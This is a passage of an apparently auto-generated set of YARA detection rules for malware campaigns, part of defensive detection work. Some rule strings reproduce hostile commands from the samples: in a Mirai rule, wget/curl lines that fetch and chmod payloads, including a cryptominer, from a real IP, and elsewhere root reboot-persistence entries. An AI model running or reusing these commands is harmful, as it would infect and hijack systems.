        $s10 = "  <trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v2\">" ascii
        $s11 = "SOFTWARE\\Martin Prikryl\\WinSCP 2\\Sessions" wide
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_df7e884a_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-df7e884a"
        date = "2026-10-23"
        campaign = "tlsh-df7e884a"
        family = ""
        hash = "55e752670ec450ecb29c3c21f3f683e13ce7d51d0025fcff2c5f7d70ee045487"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-df7e884a.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "dev/krypton/native/x86_64-windowsPK" ascii
        $s1 = "assets/minecraft/shaders/post-process/PK" ascii
        $s2 = "dev/krypton/native/x86_64-windows<" ascii
        $s3 = "assets/krypton/shaders/post-process/PK" ascii
        $s4 = "krypton-render.mixins.jsonPK" ascii
        $s5 = "assets/minecraft/shaders/PK" ascii
        $s6 = "dev/krypton/diddy/mixin/PK" ascii
        $s7 = "assets/krypton/shaders/PK" ascii
        $s8 = "assets/krypton/fonts/PK" ascii
        $s9 = "dev/krypton/xative/PK" ascii
        $s10 = "javazoom/jl/decoder/PK" ascii
        $s11 = "dev/krypton/native/PK" ascii
    condition:
        filesize < 11806636 and 12 of them
}

rule Sightlines_imphash_2937c1c9_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-2937c1c9"
        date = "2026-10-23"
        campaign = "imphash-2937c1c9"
        family = ""
        hash = "34d364fb8e3789b2e477e357c78bdeaa2a4cda2da8699c979a2e297d9cddf2e2"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-2937c1c9.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "        <dpiAware xmlns=\"http://schemas.microsoft.com/SMI/2005/WindowsSettings\">true</dpiAware>" ascii
        $s1 = "        <supportedOS Id=\"{1f676c76-80e1-4239-95bb-83d0f6d0da78}\"/>" ascii
        $s2 = "<file name=\"textshaping.dll\" loadFrom=\"%SystemRoot%\\system32\\\" />" ascii
        $s3 = "VTEnumerable<System.Generics.Collections.TPair<System.string,System.TypInfo.PTypeInfo>>8%D" ascii
        $s4 = "<file name=\"winhttp.dll\" loadFrom=\"%SystemRoot%\\system32\\\" />" ascii
        $s5 = "%TObjectList<System.Classes.TRegGroup>\\DH" ascii
        $s6 = "        <supportedOS Id=\"{35138b9a-5d96-4fbd-8e2d-a2440225f93a}\"/>" ascii
        $s7 = "        <supportedOS Id=\"{8e0f7a12-bfb3-4fe8-b9a5-48fd50a15a9a}\"/>" ascii
        $s8 = "        <supportedOS Id=\"{4a2f28e3-53b9-4441-ba9c-d69d4a4a6e38}\"/>" ascii
        $s9 = "\\TList<System.Generics.Collections.TPair<System.string,System.TypInfo.PTypeInfo>>.TEnumerator\\*F" ascii
        $s10 = "Embarcadero Delphi for Win32 compiler version 33.0 (26.0.36039.7899)" ascii
        $s11 = "<file name=\"netapi32.dll\" loadFrom=\"%SystemRoot%\\system32\\\" />" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1722368 and 12 of them
}

rule Sightlines_tlsh_310c3f5a_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-310c3f5a"
        date = "2026-10-23"
        campaign = "tlsh-310c3f5a"
        family = ""
        hash = "34d364fb8e3789b2e477e357c78bdeaa2a4cda2da8699c979a2e297d9cddf2e2"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-310c3f5a.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "        <dpiAware xmlns=\"http://schemas.microsoft.com/SMI/2005/WindowsSettings\">true</dpiAware>" ascii
        $s1 = "        <supportedOS Id=\"{1f676c76-80e1-4239-95bb-83d0f6d0da78}\"/>" ascii
        $s2 = "        <supportedOS Id=\"{35138b9a-5d96-4fbd-8e2d-a2440225f93a}\"/>" ascii
        $s3 = "        <supportedOS Id=\"{8e0f7a12-bfb3-4fe8-b9a5-48fd50a15a9a}\"/>" ascii
        $s4 = "        <supportedOS Id=\"{4a2f28e3-53b9-4441-ba9c-d69d4a4a6e38}\"/>" ascii
        $s5 = "Embarcadero Delphi for Win32 compiler version 33.0 (26.0.36039.7899)" ascii
        $s6 = "<file name=\"netapi32.dll\" loadFrom=\"%SystemRoot%\\system32\\\" />" ascii
        $s7 = "VTEnumerable<System.Generics.Collections.TPair<System.TypInfo.PTypeInfo,System.string>>'" ascii
        $s8 = "VTEnumerable<System.Generics.Collections.TPair<System.string,System.TypInfo.PTypeInfo>>'" ascii
        $s9 = "        <supportedOS Id=\"{e2011457-1546-43c5-a5fe-008deee3d3f0}\"/>" ascii
        $s10 = "<file name=\"version.dll\" loadFrom=\"%SystemRoot%\\system32\\\" />" ascii
        $s11 = "<file name=\"mpr.dll\" loadFrom=\"%SystemRoot%\\system32\\\" />" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1722368 and 12 of them
}

rule Sightlines_tlsh_4aa1b8f2_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-4aa1b8f2"
        date = "2026-10-23"
        campaign = "tlsh-4aa1b8f2"
        family = ""
        hash = "0cb21f1ed9c3db04902d28f21ae8a2605a00781bc87a1fbc9ac918da4a19fe3c"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-4aa1b8f2.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "\\Registry\\Machine\\Software\\Classes\\" wide
        $s1 = "\\REGISTRY\\MACHINE\\SOFTWARE\\Classes" wide
        $s2 = "\\REGISTRY\\USER" wide
        $s3 = "Wow6432Node" wide
        $s4 = "t$ WATAUE3" ascii
        $s5 = "@88tE@8;tgH" ascii
        $s6 = "x7H9\\$Ht0H" ascii
        $s7 = "G0H9G8u_A" ascii
        $s8 = "H SUVWATH" ascii
        $s9 = "6T{tmF M" ascii
        $s10 = "f9|$@t1H" ascii
        $s11 = "~Hx1UnBZ" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 10182656 and 12 of them
}

rule Sightlines_tlsh_ff382030_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-ff382030"
        date = "2026-10-23"
        campaign = "tlsh-ff382030"
        family = ""
        hash = "0fbc3a79711c7e73a66b97f58ab9e643841d1580eed249c37481cf2922b5c5ce"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-ff382030.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "\\Registry\\Machine\\Software\\Classes\\" wide
        $s1 = "\\REGISTRY\\MACHINE\\SOFTWARE\\Classes" wide
        $s2 = "\\REGISTRY\\USER" wide
        $s3 = "Wow6432Node" wide
        $s4 = "t$ WATAUE3" ascii
        $s5 = "G0H9G8u_A" ascii
        $s6 = "H SUVWATH" ascii
        $s7 = "6T{tmF M" ascii
        $s8 = "~Hx1UnBZ" ascii
        $s9 = "&]p}8W8J" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 9678848 and 10 of them
}

rule Sightlines_rich_header_hash_cc407ac9_prometei
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign rich_header_hash-cc407ac9"
        date = "2026-10-22"
        campaign = "rich_header_hash-cc407ac9"
        family = "prometei"
        hash = "0cb4cfb991e82c52a7904bc6cee3c10eac1adb6bf84cbbfd0b2629d0aa35781a"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/rich_header_hash-cc407ac9.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "Host Process for Windows Service" wide
        $s1 = "abnormal program termination" ascii
        $s2 = "- floating point not loaded" ascii
        $s3 = "GAIsProcessorFeaturePresent" ascii
        $s4 = "GetLogicalDriveStringsA" ascii
        $s5 = "Copyright (C) 2016" wide
        $s6 = "IsBadWritePtr" ascii
        $s7 = "IsBadCodePtr" ascii
        $s8 = "\\dH1#)AGp{2" ascii
        $s9 = "sqhost.exe" wide
        $s10 = "okmLCS[]<" ascii
        $s11 = "5 eDCV;," ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 12 of them
}

rule Sightlines_dotnet_typelib_guid_a714f431_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign dotnet_typelib_guid-a714f431"
        date = "2026-10-23"
        campaign = "dotnet_typelib_guid-a714f431"
        family = ""
        hash = "1d0f2d9db8cc9498ffed71d038690bfe52b39b3a1771bbfae0088db2d603cca0"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/dotnet_typelib_guid-a714f431.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "Software\\Microsoft\\Windows Messaging Subsystem\\Profiles\\9375CFF0413111d3B88A00104B2A6676" wide
        $s1 = "9uzQZ8M9esiGktQ2p1awgW2VefNvdHItyTIJRslztZk=" wide
        $s2 = "BCrypt.BCryptSetAlgorithmProperty(BCrypt.BCRYPT_CHAINING_MODE, BCrypt.BCRYPT_CHAIN_MODE_GCM) failed " wide
        $s3 = "zMaRPCbE0Gb4k/zB6ZNS3r1L34TENqMZD9RW6hkhoOE=" wide
        $s4 = "      <dpiAware xmlns=\"http://schemas.microsoft.com/SMI/2005/WindowsSettings\">true</dpiAware>" ascii
        $s5 = "Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging Subsystem\\Profiles\\Outlook\\9375CFF041" wide
        $s6 = "Software\\Microsoft\\Office\\15.0\\Outlook\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676" wide
        $s7 = "Software\\Microsoft\\Office\\16.0\\Outlook\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676" wide
        $s8 = "BCrypt.BCryptOpenAlgorithmProvider() failed with status code:{0}" wide
        $s9 = "      <!--<supportedOS Id=\"{1f676c76-80e1-4239-95bb-83d0f6d0da78}\" />-->" ascii
        $s10 = "      <!--<supportedOS Id=\"{35138b9a-5d96-4fbd-8e2d-a2440225f93a}\" />-->" ascii
        $s11 = "      <!--<supportedOS Id=\"{8e0f7a12-bfb3-4fe8-b9a5-48fd50a15a9a}\" />-->" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_82a27dbf_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-82a27dbf"
        date = "2026-10-23"
        campaign = "tlsh-82a27dbf"
        family = "mirai"
        hash = "000d8b06db0f227f54e426f21534ea718d61d7381fd1c3a054ce0d354fd3d423"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-82a27dbf.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows" ascii
        $s1 = "R_ARM_PC24: Compile shared libraries with -fPIC!" ascii
        $s2 = "update-rc.d S99ksync defaults 2>/dev/null || chkconfig --add S99ksync 2>/dev/null || insserv S99ksyn" ascii
        $s3 = "GCC: (Buildroot 2021.11-12449-g1bef613319) 13.3.0" ascii
        $s4 = "for exe in '%s' \"$HOME/libkys.so\" /data/local/tmp/libkys.so /data/local/.libkys.so /data/local/tmp/k" ascii
        $s5 = "for exe in '%s' /data/local/tmp/libkys.so /usr/bin/.ksync; do" ascii
        $s6 = "GCC: (GNU) 3.3.2 20031005 (Debian prerelease)" ascii
        $s7 = "%s: '%s' is not an ELF executable for ARM" ascii
        $s8 = "ST: urn:dial-multiscreen-org:service:dial:1" ascii
        $s9 = "@reboot root sleep 20 && nohup %s %s >/dev/null 2>&1 &" ascii
        $s10 = "cannot create TLS data structures: ABORT" ascii
        $s11 = "%s: cannot apply additional memory protection after relocation" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_dotnet_typelib_guid_a6afbb2b_formbook
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign dotnet_typelib_guid-a6afbb2b"
        date = "2026-10-22"
        campaign = "dotnet_typelib_guid-a6afbb2b"
        family = "formbook"
        hash = "5240b38a9efe67747c29da0026e03421942d4bb76d5619ed398e854480f6a076"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/dotnet_typelib_guid-a6afbb2b.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "  <assemblyIdentity version=\"1.0.0.0\" name=\"MyApplication.app\"/>" ascii
        $s1 = "Thermal Yield: ~{0:0.00} MWh equivalent domestic heating output" wide
        $s2 = "      <requestedPrivileges xmlns=\"urn:schemas-microsoft-com:asm.v3\">" ascii
        $s3 = "  <trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v2\">" ascii
        $s4 = "Audit exported successfully matching PeatBankData.xsd schema." wide
        $s5 = "Final Slab MC: {0:0.0}% moisture content" wide
        $s6 = "Bank Advance : {0:0.00} m stripped & harvested along face" wide
        $s7 = "Bank Section: 45.0m Face | 2 Cutters | Tairsgear" wide
        $s8 = "Rate: 260 Slabs/hr | Carting: Wheelbarrow" wide
        $s9 = "Face for Next: {0:0.00} m viable bank face preserved for next season" wide
        $s10 = "Weather Days : {0} drying days | {1} downpour days | {2} midge days" wide
        $s11 = "Cutting Tool : {0} ({1} active cutters)" wide
    condition:
        uint16(0) == 0x5A4D and filesize < 7429120 and 12 of them
}

rule Sightlines_tlsh_e066f0e1_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-e066f0e1"
        date = "2026-10-23"
        campaign = "tlsh-e066f0e1"
        family = ""
        hash = "11e4d3ce47e82d27aca5b14b6e8710655ff2805d5865c6d6d1ce20b846b5ad16"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-e066f0e1.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "META-INF/kuznya-integrity-targetPK" ascii
        $s1 = "META-INF/kuznya-integrity-targetKu" ascii
        $s2 = "^urB{EdK~iW\\hoe|KBJW|Q" ascii
        $s3 = "client.accesswidenerPK" ascii
        $s4 = "ts[iFKQyUBAClDMjTC" ascii
        $s5 = "\\w^pOUxcMJkiIwHt_" ascii
        $s6 = "PyfoZ]WvEWq~oNY_J" ascii
        $s7 = "fabric.mod.jsonPK" ascii
        $s8 = "X{e|OZVCLXGdEkyu" ascii
        $s9 = "1_iKaCagzuzsz}z{z-" ascii
        $s10 = "kDIp~ZIybQ*CAbf^" ascii
        $s11 = "If?Kqheg|<+[}zU" ascii
    condition:
        filesize < 39490666 and 12 of them
}

rule Sightlines_signer_cert_sha1_b5077fa2_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign signer_cert_sha1-b5077fa2"
        date = "2026-10-23"
        campaign = "signer_cert_sha1-b5077fa2"
        family = ""
        hash = "0f780235c2fe55f3954aba8f5dba435617e46f3c23102a698e582bfa8322f4ac"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/signer_cert_sha1-b5077fa2.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "GCC: (MinGW-W64 x86_64-msvcrt-posix-seh, built by Brecht Sanders) 13.1.0" ascii
        $s1 = "The result is too small to be represented (UNDERFLOW)" ascii
        $s2 = "Copyright 2026 Google LLC. All rights reserved." wide
        $s3 = "%d bit pseudo relocation at %p out of range, targeting %p, yielding the value %p." ascii
        $s4 = "Partial loss of significance (PLOSS)" ascii
        $s5 = "Total loss of significance (TLOSS)" ascii
        $s6 = "Overflow range error (OVERFLOW)" ascii
        $s7 = "Argument domain error (DOMAIN)" ascii
        $s8 = "Argument singularity (SIGN)" ascii
        $s9 = "C:\\Users\\%s\\AppData\\Roaming" wide
        $s10 = "%s\\Google\\Chrome\\Update" wide
        $s11 = "Google Installer (x86)" wide
    condition:
        uint16(0) == 0x5A4D and filesize < 11936592 and 12 of them
}

rule Sightlines_tlsh_f4a3e3a5_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-f4a3e3a5"
        date = "2026-10-23"
        campaign = "tlsh-f4a3e3a5"
        family = "mirai"
        hash = "0a572293de07a18f1cac590e7fc00420044e57b2a61a271e2c8fac2fd53c86f7"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-f4a3e3a5.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "=http://31.56.209.86/%s;(wget -qO .upd $U||curl -skLo .upd $U||busybox wget -qO .upd $U);chmod 777 ." ascii
        $s1 = "http://31.56.209.86/xmrig_%s;(wget -qO .xm $U||curl -so .xm $U||busybox wget -qO .xm $U); chmod 777 " ascii
        $s2 = "<!doctype html><meta charset=utf-8><title>guardian proxy</title><style>body{background:#111;color:#0" ascii
        $s3 = "<!doctype html><meta charset=utf-8><title>guardian proxy</title><style>body{background:#0b0b0b;color" ascii
        $s4 = ":#5f5;font-family:monospace}table{border-collapse:collapse}td,th{border:1px solid #333;padding:4px 8" ascii
        $s5 = "px}a{color:#5ff}</style><h2>guardian proxy control</h2><p>uptime %lds | total %d | active %d | ping " ascii
        $s6 = "f0;font-family:monospace}</style><h2>guardian proxy panel</h2><form method=post action=/login>passwo" ascii
        $s7 = "Set-Cookie: sid=%s; Path=/; Max-Age=%d; HttpOnly" ascii
        $s8 = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" ascii
        $s9 = "%dms | proxy users %d</p><p>proxy: <b>socks5 :%d</b> (same port as panel)</p><h3>connected clients (" ascii
        $s10 = "rd: <input type=password name=password><input type=submit value=login></form><p>protected: brute-for" ascii
        $s11 = "t value='add proxy account'></form><form method=post action=/removeuser>user <input name=user size=8" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_86960d55_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-86960d55"
        date = "2026-10-22"
        campaign = "tlsh-86960d55"
        family = ""
        hash = "1a8ccf0b0e46e95a66c89a1ccffe573ec9e6ff781dc56e0790995429f4ff43d9"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-86960d55.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "skraUiUH_J=ZD6YA3YA2Z?.YNF^v}]u{YNF\\@/YB4[E8_J=eTHqcX" ascii
        $s1 = "Copyright (c) 1992-2004 by P.J. Plauger, licensed by Dinkumware, Ltd. ALL RIGHTS RESERVED." ascii
        $s2 = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\{3F709462-4AD7-482F-8761-C6ED6AD145A1}" ascii
        $s3 = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\{C412F191-BB15-4e40-9CCC-97E571D2C6BF}" ascii
        $s4 = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\{787DFE02-CC6C-4AAC-B455-166BBEE4C5AF}" ascii
        $s5 = ".?AV?$IDispatchImpl@UIAxWinAmbientDispatchEx@@$1?_GUID_b2d0778b_ac99_4c58_a5c8_e7724e5316b5@@3U__s_G" ascii
        $s6 = "Hide WhiteBoard~Bitmap Files (*.bmp)|*.bmp|Portable Network Graphics (*.png)|*.png|JPEG files (*.jpg" wide
        $s7 = "datalen + idata->recvbytes <= MAX_DEFLATE_SIZE (MAX_STREAMLEN)" ascii
        $s8 = "m_pCfg || !\"Call SetConfig to use MB_DONTSHOWAGAIN\"" ascii
        $s9 = "WaitForSingleObject() FAILED - mutex: %s res: 0x%x (%d)" ascii
        $s10 = "SOFTWARE\\Productive Computer Insight\\PCICTL" ascii
        $s11 = "Creating NC_AUDIOFMT for replay, hash=%d" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 7480048 and 12 of them
}

rule Sightlines_dotnet_typelib_guid_3ca58c93_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign dotnet_typelib_guid-3ca58c93"
        date = "2026-10-23"
        campaign = "dotnet_typelib_guid-3ca58c93"
        family = ""
        hash = "1fbf0c7a8e4c7371af8fc016b1e25099a78b673a42342f43367c42f98cb0c5b6"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/dotnet_typelib_guid-3ca58c93.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "aR3nbf8dQp2feLmk31.lSfgApatkdxsVcGcrktoFd.resources" ascii
        $s1 = "RegExPatternsDropDownList.DefaultModifiers" wide
        $s2 = "]Regular Expression Pattern to use for validation.  See accompanied regular expression bank..." ascii
        $s3 = "'System.Globalization.DateTimeFormatInfo+" ascii
        $s4 = "lType of comparison to perform with ValueToCompare.  Default is data type checking if DataType is no" ascii
        $s5 = "+System.Globalization.GregorianCalendarTypes" ascii
        $s6 = "2Message to display/return iwhen validation failed." ascii
        $s7 = "AI-driven multi-domain data validation and integrity assurance framework with adaptive rule orchestr" wide
        $s8 = "_Highest value the control can have.  Remember to set DataType when range is not of type String." ascii
        $s9 = "<Case sensitivity validation works best with String DataType." ascii
        $s10 = "iAI-driven multi-domain data validation and integrity assurance framework with adaptive rule orchest" ascii
        $s11 = "^Lowest value the control can have.  Remember to set DataType when range is not of type String." ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 2161664 and 12 of them
}

rule Sightlines_imphash_e98573c7_netsupport
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-e98573c7"
        date = "2026-10-22"
        campaign = "imphash-e98573c7"
        family = "netsupport"
        hash = "3f9cdacaf03050325aa554e4f7bc769ce2fe9554a06237a1ec8a191bade0bf18"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-e98573c7.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "Usage: %s (4 InheritableEventHandles) (CommandLineToSpawn)" ascii
        $s1 = "@Microsoft Visual C++ Runtime Library" wide
        $s2 = "NetSupport Remote Command Prompt" wide
        $s3 = "GPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPAD" ascii
        $s4 = "DDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDIN" ascii
        $s5 = "@4@5D5H5L5P5T5X5\\5`5d5h5l5p5t5x5|5" ascii
        $s6 = "557;7A7G7M7S7Z7a7h7o7v7}7" ascii
        $s7 = "ConsoleWindowClass" ascii
        $s8 = "NetSupport Ltd" wide
        $s9 = "remcmdstub.exe" ascii
        $s10 = "1C1H1O1U1 2]2t2" ascii
        $s11 = "nKERNEL32.DLL" wide
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_ee036fe9_asyncrat
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-ee036fe9"
        date = "2026-10-22"
        campaign = "tlsh-ee036fe9"
        family = "asyncrat"
        hash = "245dfa22e021f677270215518694d0c679693dbfc5e08686ad94a0c0dfe7a1dc"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-ee036fe9.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "QFleK/GdNye8ar8mgWXZFO5zWGu0LUhvR8Sp496MYRibJwBgDHgV+Gi9r6wj3kpf" ascii
        $s1 = "zWaHROTDwCeBUSDsrXEPd8AKcA74rKo+n0gkrm31G942Z+NcLtemqkdF5MeBjwID" ascii
        $s2 = "EBESExQVFhcYGRobHB0eHyAhIiMkJSYnKCkqKywtLi8wMTIzNDU2Nzg5Ojs8PT4/" ascii
        $s3 = "ICEiIyQlJicoKSorLC0uLzAxMjM0NTY3ODk6Ozw9Pj9AYWJjZGVmZ2hpamtsbW5v" ascii
        $s4 = "eJWmmnxhuAS1+OvL9GERM/ZlJbcRQovYaW7H/5W0gUOpfq6/gtZNzBGjg3FqEF4Z" ascii
        $s5 = "f3hHAjAM42VVnQEy9b6q7vYwyUiI/GrxvuberxXLvHphmpOXZ11dIJWKzdLy+j0N" ascii
        $s6 = "woQdDUgPqgaU8YIH9JnM5VL3mRfiBeiFuPjScQW9v6VBX8n0qoNz0fhtw/oE0pAI" ascii
        $s7 = "GBkaGxwdHh8gISIjJCUmJygpKissLS4vMDEyMzQ1Njc4OTo7PD0+P0BhYmNkZWZn" ascii
        $s8 = "Sve4kZm1o7VAXSlF5/KzcBOcnj/v6WEjaEQ4V1eNfqahsIgqubIDJ0zrpDPhNn96" ascii
        $s9 = "0eQDPEfUBEv9hQ3Sa7UKpfqotTVsmLJC1sm720D5vKzjbNgydVzfRc8N1txZPdGr" ascii
        $s10 = "OW+VeASwLbCwsNBmGMaAiAxRzSQcEZGdVLUKOtk6HYplYBa4parXgdNUJ+hes237" ascii
        $s11 = "uLm6u7y9vr/AwcLDxMXGx8jJysvMzc7P0NHS09TV1tfY2drb3N3e3+Dh4uPk5ebn" ascii
    condition:
        filesize < 3689100 and 12 of them
}

rule Sightlines_tlsh_d52bdde4_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-d52bdde4"
        date = "2026-10-23"
        campaign = "tlsh-d52bdde4"
        family = ""
        hash = "033e075426fe475870ccca9cc9caebdfb34206461ca900cecfb8cfa9ec5ff3df"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-d52bdde4.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "*NSt13__facet_shims12_GLOBAL__N_115moneypunct_shimIwLb0EEE" ascii
        $s1 = "*NSt13__facet_shims12_GLOBAL__N_115moneypunct_shimIcLb0EEE" ascii
        $s2 = "*NSt13__facet_shims12_GLOBAL__N_115moneypunct_shimIwLb1EEE" ascii
        $s3 = "*NSt13__facet_shims12_GLOBAL__N_115moneypunct_shimIcLb1EEE" ascii
        $s4 = "St23_Sp_counted_ptr_inplaceINSt8__detail4_NFAINSt7__cxx1112regex_traitsIcEEEESaIvELN9__gnu_cxx12_Loc" ascii
        $s5 = "*NSt13__facet_shims12_GLOBAL__N_114money_put_shimIwEE" ascii
        $s6 = "Invalid location of '-' within '[...]' in POSIX regular expression" ascii
        $s7 = "*NSt13__facet_shims12_GLOBAL__N_114money_put_shimIcEE" ascii
        $s8 = "NSt8__detail11_AnyMatcherINSt7__cxx1112regex_traitsIcEELb0ELb0ELb0EEE" ascii
        $s9 = "*NSt13__facet_shims12_GLOBAL__N_114money_get_shimIwEE" ascii
        $s10 = "NSt8__detail11_AnyMatcherINSt7__cxx1112regex_traitsIcEELb0ELb0ELb1EEE" ascii
        $s11 = "NSt8__detail11_AnyMatcherINSt7__cxx1112regex_traitsIcEELb0ELb1ELb0EEE" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 3034112 and 7 of them
}

rule Sightlines_imphash_65a3d861_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-65a3d861"
        date = "2026-10-23"
        campaign = "imphash-65a3d861"
        family = ""
        hash = "22387bf1bd80fb80d3b7379d37219449f06b0e445c38eca17cd7edb8891c6aaa"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-65a3d861.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = " inflate 1.2.11 Copyright 1995-2017 Mark Adler " ascii
        $s1 = "    name=\"CompanyName.ProductName.YourApp\"" ascii
        $s2 = "Floating-point stack overflow or underflow" wide
        $s3 = "Floating-point underflow (exponent too small)" wide
        $s4 = "Floating-point overflow (exponent to great)" wide
        $s5 = "Exception handler returned unknown value" wide
        $s6 = "Exception handler tried to continue after non-continuable exception" wide
        $s7 = "Division by zero (floating-point)" wide
        $s8 = "        processorArchitecture=\"X86\"" ascii
        $s9 = "Invalid floating-point operation" wide
        $s10 = "Denormal floating-point operand" wide
        $s11 = "Inexact floating-point result" wide
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_e17bd1d3_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-e17bd1d3"
        date = "2026-10-23"
        campaign = "tlsh-e17bd1d3"
        family = ""
        hash = "269b268ad54168172f307ae50896b64735e3164946f4abc91c2e8257b0fb6300"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-e17bd1d3.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "N[C?K4WdL2A$?L38H*4D'OZEWaNWdMJV@SaEBR39I+?L3VaMfo]=H3amWdoYkub" ascii
        $s1 = "?qt_qFindChild_helper@@YAPEAVQObject@@PEBV1@AEBVQString@@AEBUQMetaObject@@V?$QFlags@W4FindChildOptio" ascii
        $s2 = "?glDiscardFramebufferEXT@QOpenGLExtensions@@QEAAXIHPEBI@Z" ascii
        $s3 = "?mouseDoubleClickEvent@QGraphicsProxyWidget@@MEAAXPEAVQGraphicsSceneMouseEvent@@@Z" ascii
        $s4 = "?modifiers@QGraphicsSceneContextMenuEvent@@QEBA?AV?$QFlags@W4KeyboardModifier@Qt@@@@XZ" ascii
        $s5 = "?qInstallMessageHandler@@YAP6AXW4QtMsgType@@AEBVQMessageLogContext@@AEBVQString@@@ZP6AX012@Z@Z" ascii
        $s6 = "?qt_metacall@QGraphicsDropShadowEffect@@UEAAHW4Call@QMetaObject@@HPEAPEAX@Z" ascii
        $s7 = "?d_func@QGraphicsPolygonItem@@AEBAPEBVQGraphicsPolygonItemPrivate@@XZ" ascii
